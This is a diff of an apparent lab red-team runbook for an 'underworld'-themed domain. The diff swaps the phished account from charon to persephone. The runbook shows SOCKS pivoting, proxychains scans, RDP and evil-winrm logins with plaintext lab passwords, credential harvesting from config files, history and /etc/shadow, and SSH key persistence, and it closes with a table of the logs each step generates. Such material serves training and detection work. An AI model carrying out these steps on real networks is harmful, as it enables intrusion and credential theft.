@@ -4,7 +4,7 @@
 
 Runbook for moving from the gatehouse foothold into the internal network and
 escalating. Chosen approach: **`ssh -D` dynamic SOCKS** for the pivot, **RDP as
-`charon`** for lateral access.
+`persephone`** for lateral access.
 
 ## Where we start
 
@@ -21,8 +21,8 @@ Internal 192.168.1.0/24
   - Workstation   192.168.1.??    <- to be built + domain-joined
 ```
 
-AD creds (from phishing): `charon / Ferryman1!` — **normal** domain user, can RDP.
-Other wardens same password: `cerberus`, `minos`, `persephone`, `hades`.
+AD creds (from phishing the victim): `persephone / Demeter01!` — **normal** domain user, can RDP.
+Other wardens share `Ferryman1!`: `charon`, `cerberus`, `minos`, `hades`.
 
 ---
 
@@ -41,12 +41,12 @@ Do this at the VM console, not over the pivot.
    ```powershell
    Add-Computer -DomainName "hades.underworld" -Credential (Get-Credential) -Restart
    ```
-4. After reboot, log in once as `HADES\charon` so the user profile is created.
-5. Enable RDP and authorise `charon`:
+4. After reboot, log in once as `HADES\persephone` so the user profile is created.
+5. Enable RDP and authorise `persephone`:
    ```powershell
    Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-   Add-LocalGroupMember -Group "Remote Desktop Users" -Member "HADES\charon"
+   Add-LocalGroupMember -Group "Remote Desktop Users" -Member "HADES\persephone"
    ```
 
 ## Step 2 — Internal recon from the foothold (on the gatehouse, as `daemon`)
@@ -73,7 +73,7 @@ cat cgi-bin/login.py | grep -i -E 'AD_|pass|bind'   # AD bind config
 cat db/setup_db.sh db/schema.sql | grep -i -E 'pass|styx|hades_app'
 cat /home/*/.bash_history 2>/dev/null
 ```
-- Try the admin/sudo user that built the box (the one who ran `sudo ./install_apache.sh`) — check for a reused lab password (`Ferryman1!`).
+- Try the admin/sudo user that built the box (the one who ran `sudo ./install_apache.sh`) — check for a reused lab password (`Ferryman1!` / `Demeter01!`).
 - If you can escalate `daemon` → user/root: append your Kali pubkey to that user's
   `~/.ssh/authorized_keys`, or read `/etc/shadow` and crack offline.
 
@@ -94,18 +94,18 @@ proxychains (`/etc/proxychains4.conf`): `socks5 127.0.0.1 1080`
 proxychains nmap -Pn -p3389 192.168.1.50   # sanity check through the tunnel
 ```
 
-## Step 5 — RDP lateral as `charon`
+## Step 5 — RDP lateral as `persephone`
 
 ```bash
-proxychains xfreerdp /u:charon /d:hades.underworld /p:'Ferryman1!' \
+proxychains xfreerdp /u:persephone /d:hades.underworld /p:'Demeter01!' \
   /v:192.168.1.50 /cert:ignore +clipboard /dynamic-resolution
 ```
 (RDP over SOCKS can be laggy. Painless alternative while you have the cred:
-`proxychains evil-winrm -i 192.168.1.50 -u charon -p 'Ferryman1!'` if WinRM/5985 is open.)
+`proxychains evil-winrm -i 192.168.1.50 -u persephone -p 'Demeter01!'` if WinRM/5985 is open.)
 
 ## Step 6 — Local privilege escalation on the workstation
 
-As `charon` (normal user), enumerate then escalate:
+As `persephone` (normal user), enumerate then escalate:
 
 ```powershell
 whoami /priv ; whoami /groups
@@ -128,7 +128,7 @@ generates (Windows Security log → Splunk 192.168.1.6):
 | Technique | Event / log | Where to see it |
 |---|---|---|
 | Domain join | 4741 (computer acct created), 4624 | DC security log |
-| RDP logon (charon) | **4624 Logon Type 10** (RemoteInteractive), 4778 | Workstation |
+| RDP logon (persephone) | **4624 Logon Type 10** (RemoteInteractive), 4778 | Workstation |
 | Failed RDP | 4625 Type 10 | Workstation |
 | SSH pivot | `Accepted password/publickey` | Gatehouse `/var/log/auth.log` |
 | Internal nmap sweep | connection spikes / IDS, pfSense cross-zone logs | pfSense / Splunk |
